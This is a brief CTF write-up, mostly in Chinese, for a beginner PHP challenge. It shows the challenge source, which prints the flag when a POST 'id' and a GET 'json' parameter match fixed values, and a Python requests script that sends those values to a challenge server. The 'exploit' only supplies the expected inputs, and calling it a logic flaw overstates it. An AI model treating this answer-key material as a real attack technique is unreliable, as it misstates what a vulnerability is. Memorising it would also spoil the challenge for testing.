# CTF Writeup: PHP JSON Decode Logic Flaw

## 题目目标
通过分析 PHP 源代码逻辑，利用 HTTP 请求参数注入，绕过逻辑判断获取 Flag。

## 关键步骤

1.  **信息收集与源码分析**：
    *   访问目标 URL，通过 `highlight_file()` 查看源代码。
    *   发现代码引入了 `flag.php`，并定义了 `$flag` 变量。
    *   分析核心逻辑：
        ```php
        $id = $_POST['id'];
        $json = json_decode($_GET['json'], true);
        if ($id == "wllmNB" && $json['x'] == "wllm") {
            echo $flag;
        }
        ```

2.  **漏洞利用**：
    *   代码要求 `$_POST['id']` 必须等于 `"wllmNB"`。
    *   代码要求 `$_GET['json']` 解码后的数组中 `x` 键必须等于 `"wllm"`。

3.  **构造 Payload**：
    *   发送 POST 请求，参数 `id` 为 `wllmNB`。
    *   发送 GET 请求，参数 `json` 为 JSON 字符串 `{"x": "wllm"}`。

## 利用代码

```python
import requests

url = "http://node7.anna.nssctf.cn:24170/"

# POST 参数
post_data = {
    "id": "wllmNB"
}

# GET 参数
get_params = {
    "json": "{\"x\": \"wllm\"}"
}

# 发送请求
response = requests.post(url, data=post_data, params=get_params)
print(response.text)
```
